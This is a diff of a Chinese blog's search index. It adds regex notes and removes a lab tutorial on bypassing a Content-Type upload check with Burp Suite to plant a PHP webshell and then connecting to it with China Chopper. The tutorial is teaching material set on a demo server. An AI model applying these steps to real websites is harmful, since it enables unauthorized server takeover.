+<p>（？&lt;=（a））表示以a开头</p>
+<p>（？=（a））表示以a结尾</p>
+<p>\d , \w  , \ s 匹配数字，字符，空格</p>
+<p>\D , \W  ,\S 匹配非数字，非字符，非空格</p>
+]]></content>
   </entry>
   <entry>
     <title>绕过前台脚本检测扩展名上传webshell</title>
@@ -1679,48 +1721,6 @@
 ]]></content>
       <tags>
         <tag>-webshell -前端</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>绕过content_type检测文件类型上传webshell</title>
-    <url>/2021/12/27/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/</url>
-    <content><![CDATA[<h2 id="绕过content-type检测文件类型上传webshell"><a href="#绕过content-type检测文件类型上传webshell" class="headerlink" title="绕过content_type检测文件类型上传webshell"></a>绕过content_type检测文件类型上传webshell</h2><p>目的:</p>
-<ul>
-<li>理解绕过Content-Type检测文件类型上传的原理</li>
-<li>学习绕过Content-Type检测文件类型上传的过程</li>
-</ul>
-<p>原理:</p>
-<ul>
-<li>当浏览器在上传文件到服务器的时候，服务器对说上传文件的Content-Type类型进行检测，如果是白名单允许的，则可以正常上传，否则上传失败。</li>
-<li>绕过Content–Type文件类型检测，就是用BurpSuite截取并修改数据包中文件的Content-Type类型，使其符合白名单的规则，达到上传的目的。</li>
-</ul>
-<p>过程：</p>
-<ul>
-<li><p>打开火狐浏览器，修改代理127.0.0.1:8080<img src="http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103046467.png" alt="image-20211228103046467"></p>
-</li>
-<li><p>打开burp，点击intercept is off<img src="http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103152265.png" alt="image-20211228103152265"></p>
-</li>
-<li><p>打开浏览器,输入<a href="http://192.168.1.3:8080/up,%E8%BF%9B%E5%85%A5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%82%B9%E5%87%BBcontent_type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell%E3%80%82![image-20211228103256712](http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103256712.png)">http://192.168.1.3:8080/up,进入文件上传漏洞演示脚本，点击content_type检测文件类型上传webshell。![image-20211228103256712](http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103256712.png)</a></p>
-</li>
-<li><p>上传php文件，前台显示错误窗口<img src="http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103342121.png" alt="image-20211228103342121"></p>
-</li>
-<li><p>Burp开启抓包</p>
-</li>
-<li><p>Burp抓到的数据包,在数据包中的content-type的application-stream修改为image/gif<img src="http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103504817.png" alt="image-20211228103504817"></p>
-</li>
-<li><p>点击forward，发送数据包，前台提示上传lubr.php成功<img src="http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103538500.png" alt="image-20211228103538500"></p>
-</li>
-<li><p>浏览器输入地址<a href="http://192.168.1.3:8080/up/uploads/lubr.php%EF%BC%8C%E9%A1%B5%E9%9D%A2%E6%B2%A1%E6%9C%89%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA![image-20211228103621026](http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103621026.png)">http://192.168.1.3:8080/up/uploads/lubr.php，页面没有错误提示![image-20211228103621026](http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103621026.png)</a></p>
-</li>
-<li><p>打开中国菜刀，添加木马地址，密码，lubr，脚本类型php(eval)，点击添加<img src="http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103730160.png" alt="image-20211228103730160"></p>
-</li>
-<li><p>双击添加记录，可查看完整目录<img src="http://121.5.125.62/image/%E7%BB%95%E8%BF%87content-type%E6%A3%80%E6%B5%8B%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0webshell/image-20211228103747989.png" alt="image-20211228103747989"></p>
-</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>webshell</tag>
-        <tag>content_type</tag>
       </tags>
   </entry>
   <entry>
